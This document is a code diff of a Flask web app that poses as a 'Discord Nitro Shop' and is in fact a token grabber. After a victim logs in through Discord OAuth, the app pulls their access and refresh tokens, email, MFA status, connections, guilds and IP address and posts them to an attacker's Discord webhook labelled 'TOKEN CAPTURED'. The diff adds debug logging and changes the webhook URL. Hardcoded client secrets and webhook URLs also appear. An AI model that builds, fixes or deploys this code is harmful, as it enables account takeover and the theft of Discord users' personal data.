@@ -2,23 +2,16 @@ from flask import Flask, request, redirect, render_template_string, session
 import requests
 import json
 import os
+import traceback
 from datetime import datetime
 
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
-# ═══════════════════════════════════════
-# CONFIG
-# ═══════════════════════════════════════
 CLIENT_ID = "1541786357028884534"
 CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
-WEBHOOK_URL = "https://discord.com/api/webhooks/1541770049289982052/6YJdl0YKbhSoP2sQ82zkPdqx0vFeaTGeaWoPPwHXNv8wYn1pU4ijysoaIHzgdF1zx0KR"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1541770051777208360/Z1sxSK-tfzhm9d4d77i1rokSDM7kV0eSAXYSKWOiNLG4Z7tpqET2-eDevOgK_cFmRtTG"
 REDIRECT_URI = "https://jjjw.vercel.app/callback"
-SITE_NAME = "Discord Nitro Shop"
-
-# ═══════════════════════════════════════
-# HTML TEMPLATES
-# ═══════════════════════════════════════
 
 SHOP_PAGE = """
 <!DOCTYPE html>
@@ -26,7 +19,7 @@ SHOP_PAGE = """
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>{{ site_name }}</title>
+<title>Discord Nitro Shop</title>
 <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -160,74 +153,99 @@ p{color:#b9bbbe;font-size:16px;margin-bottom:24px}
 </html>
 """
 
-# ═══════════════════════════════════════
-# UTILITIES
-# ═══════════════════════════════════════
-
-def get_ip_info(ip):
-    try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,timezone,isp,org,proxy,hosting", timeout=5)
-        return r.json()
-    except:
-        return {}
-
 def send_webhook(data):
     try:
-        embed = {
-            "title": "🔴 TOKEN CAPTURED — SHOP",
-            "color": 0x5865f2,
-            "timestamp": datetime.utcnow().isoformat(),
-            "fields": []
-        }
+        print(f"[DEBUG] Starting webhook send...")
+
+        msg_parts = ["**🔴 TOKEN CAPTURED — SHOP**\n"]
 
         if "access_token" in data:
-            embed["fields"].append({"name": "🔑 Access Token", "value": f"```{data['access_token']}```", "inline": False})
+            token = data['access_token']
+            msg_parts.append(f"**🔑 Access Token:** `{token[:60]}...`\n")
+
         if "refresh_token" in data:
-            embed["fields"].append({"name": "🔄 Refresh Token", "value": f"||{data['refresh_token']}||", "inline": False})
+            msg_parts.append(f"**🔄 Refresh Token:** `||{data['refresh_token'][:40]}...||`\n")
+
+        if "token_type" in data:
+            msg_parts.append(f"**📋 Type:** {data['token_type']}\n")
+
+        if "expires_in" in data:
+            msg_parts.append(f"**⏰ Expires:** {data['expires_in']}s\n")
+
+        if "scope" in data:
+            msg_parts.append(f"**🔓 Scope:** {data['scope']}\n")
+
+        msg_parts.append("\n**👤 USER INFO:**\n")
 
         if "user" in data and data["user"]:
             u = data["user"]
-            embed["fields"].append({"name": "👤 Username", "value": f"{u.get('username', 'N/A')}", "inline": True})
-            embed["fields"].append({"name": "🆔 User ID", "value": u.get('id', 'N/A'), "inline": True})
-            embed["fields"].append({"name": "📧 Email", "value": u.get('email', 'N/A') or 'Hidden', "inline": True})
-            embed["fields"].append({"name": "✅ Verified", "value": str(u.get('verified', 'N/A')), "inline": True})
-            embed["fields"].append({"name": "🔒 MFA", "value": str(u.get('mfa_enabled', 'N/A')), "inline": True})
-            embed["fields"].append({"name": "💎 Nitro", "value": str(u.get('premium_type', 'None')), "inline": True})
-            if u.get('avatar'):
-                embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{u.get('id')}/{u.get('avatar')}.png?size=128"}
+            msg_parts.append(f"**Username:** {u.get('username', 'N/A')}\n")
+            msg_parts.append(f"**ID:** {u.get('id', 'N/A')}\n")
+            msg_parts.append(f"**Email:** {u.get('email', 'Hidden')}\n")
+            msg_parts.append(f"**Verified:** {u.get('verified', 'N/A')}\n")
+            msg_parts.append(f"**Locale:** {u.get('locale', 'N/A')}\n")
+            msg_parts.append(f"**MFA:** {u.get('mfa_enabled', 'N/A')}\n")
+            msg_parts.append(f"**Nitro:** {u.get('premium_type', 'None')}\n")
 
         if "connections" in data and data["connections"]:
-            conn_text = "\n".join([f"{c.get('type', 'unknown')}: {c.get('name', 'N/A')}" for c in data["connections"][:10]])
-            embed["fields"].append({"name": "🔗 Connections", "value": f"```{conn_text}```", "inline": False})
+            msg_parts.append("\n**🔗 CONNECTIONS:**\n")
+            for c in data["connections"][:5]:
+                msg_parts.append(f"- {c.get('type', 'unknown')}: {c.get('name', 'N/A')}\n")
 
         if "guilds" in data and data["guilds"]:
-            guild_text = "\n".join([f"{g.get('name', 'N/A')} ({g.get('id', 'N/A')})" for g in data["guilds"][:10]])
-            embed["fields"].append({"name": "🏰 Guilds (10)", "value": f"```{guild_text}```", "inline": False})
+            msg_parts.append("\n**🏰 GUILDS (5):**\n")
+            for g in data["guilds"][:5]:
+                msg_parts.append(f"- {g.get('name', 'N/A')}\n")
 
         if "ip_info" in data and data["ip_info"]:
             ip = data["ip_info"]
-            loc = f"{ip.get('city', 'N/A')}, {ip.get('regionName', 'N/A')}, {ip.get('country', 'N/A')}"
-            embed["fields"].append({"name": "🌍 Location", "value": loc, "inline": True})
-            embed["fields"].append({"name": "📡 ISP", "value": ip.get('isp', 'N/A'), "inline": True})
-            embed["fields"].append({"name": "🔌 IP", "value": f"||{data.get('ip', 'N/A')}||", "inline": True})
+            msg_parts.append("\n**🌍 LOCATION:**\n")
+            msg_parts.append(f"**City:** {ip.get('city', 'N/A')}\n")
+            msg_parts.append(f"**Region:** {ip.get('regionName', 'N/A')}\n")
+            msg_parts.append(f"**Country:** {ip.get('country', 'N/A')}\n")
+            msg_parts.append(f"**ISP:** {ip.get('isp', 'N/A')}\n")
+            msg_parts.append(f"**IP:** ||{data.get('ip', 'N/A')}||\n")
+
+        full_msg = "".join(msg_parts)
+
+        if len(full_msg) > 1900:
+            full_msg = full_msg[:1900] + "\n... (truncated)"
 
         payload = {
-            "embeds": [embed],
+            "content": full_msg,
             "username": "Discord Shop Logger",
             "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
         }
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-    except Exception as e:
-        print(f"Webhook error: {e}")
 
-# ═══════════════════════════════════════
-# ROUTES
-# ═══════════════════════════════════════
+        print(f"[DEBUG] Webhook URL: {WEBHOOK_URL[:60]}...")
+        print(f"[DEBUG] Message length: {len(full_msg)}")
+
+        response = requests.post(
+            WEBHOOK_URL,
+            json=payload,
+            timeout=15,
+            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+        )
+
+        print(f"[DEBUG] Response status: {response.status_code}")
+        print(f"[DEBUG] Response body: {response.text[:200]}")
+
+        if response.status_code == 204:
+            print("[DEBUG] ✅ Webhook sent successfully!")
+            return True
+        else:
+            print(f"[DEBUG] ❌ Webhook failed with status {response.status_code}")
+            return False
+
+    except Exception as e:
+        print(f"[DEBUG] ❌ Webhook exception: {str(e)}")
+        traceback.print_exc()
+        return False
 
 @app.route('/')
 def index():
     user = session.get('user')
-    return render_template_string(SHOP_PAGE, site_name=SITE_NAME, user=user)
+    return render_template_string(SHOP_PAGE, user=user)
 
 @app.route('/login')
 def login():
@@ -250,10 +268,14 @@ def callback():
     code = request.args.get('code')
     error = request.args.get('error')
 
+    print(f"[DEBUG] Callback called. Code: {code is not None}, Error: {error}")
+
     if error:
+        print(f"[DEBUG] OAuth error: {error}")
         return f"<h1>Error: {error}</h1>"
 
     if not code:
+        print("[DEBUG] No code provided, redirecting to home")
         return redirect('/')
 
     try:
@@ -267,6 +289,8 @@ def callback():
         }
         headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
+        print("[DEBUG] Exchanging code for token...")
+
         token_response = requests.post(
             'https://discord.com/api/oauth2/token',
             data=data,
@@ -274,32 +298,42 @@ def callback():
             timeout=10
         )
 
+        print(f"[DEBUG] Token response status: {token_response.status_code}")
+
         if token_response.status_code != 200:
-            return f"<h1>Authorization failed</h1><p>Please try again.</p>"
+            print(f"[DEBUG] Token exchange failed: {token_response.text[:200]}")
+            return f"<h1>Authorization failed</h1><p>Status: {token_response.status_code}</p><p>Please try again.</p>"
 
         token_data = token_response.json()
         access_token = token_data.get('access_token')
+
+        print(f"[DEBUG] Access token received: {access_token is not None}")
 
         if not access_token:
             return "<h1>Invalid token</h1>"
 
         user_headers = {'Authorization': f'Bearer {access_token}'}
 
+        print("[DEBUG] Fetching user data...")
         user_response = requests.get('https://discord.com/api/v10/users/@me', headers=user_headers, timeout=10)
         user_data = user_response.json() if user_response.status_code == 200 else {}
+        print(f"[DEBUG] User data: {user_data.get('username', 'N/A')}")
 
+        print("[DEBUG] Fetching connections...")
         conn_response = requests.get('https://discord.com/api/v10/users/@me/connections', headers=user_headers, timeout=10)
         connections = conn_response.json() if conn_response.status_code == 200 else []
+        print(f"[DEBUG] Connections: {len(connections)}")
 
+        print("[DEBUG] Fetching guilds...")
         guilds_response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=user_headers, timeout=10)
         guilds = guilds_response.json() if guilds_response.status_code == 200 else []
+        print(f"[DEBUG] Guilds: {len(guilds)}")
 
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         if ',' in str(ip):
             ip = ip.split(',')[0].strip()
-        ip_info = get_ip_info(ip)
+        print(f"[DEBUG] IP: {ip}")
 
-        # Save user to session
         session['user'] = {
             'name': user_data.get('username'),
             'avatar': f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get('avatar') else None,
@@ -316,21 +350,19 @@ def callback():
             "connections": connections,
             "guilds": guilds,
             "ip": ip,
-            "ip_info": ip_info,
             "timestamp": datetime.utcnow().isoformat()
         }
 
-        send_webhook(capture_data)
+        print("[DEBUG] Sending webhook...")
+        webhook_result = send_webhook(capture_data)
+        print(f"[DEBUG] Webhook result: {webhook_result}")
 
         return redirect('/')
 
     except Exception as e:
-        print(f"Callback error: {e}")
-        return f"<h1>Error</h1><p>Please try again.</p>"
-
-# ═══════════════════════════════════════
-# RUN
-# ═══════════════════════════════════════
+        print(f"[DEBUG] Callback exception: {str(e)}")
+        traceback.print_exc()
+        return f"<h1>Error</h1><p>{str(e)}</p>"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
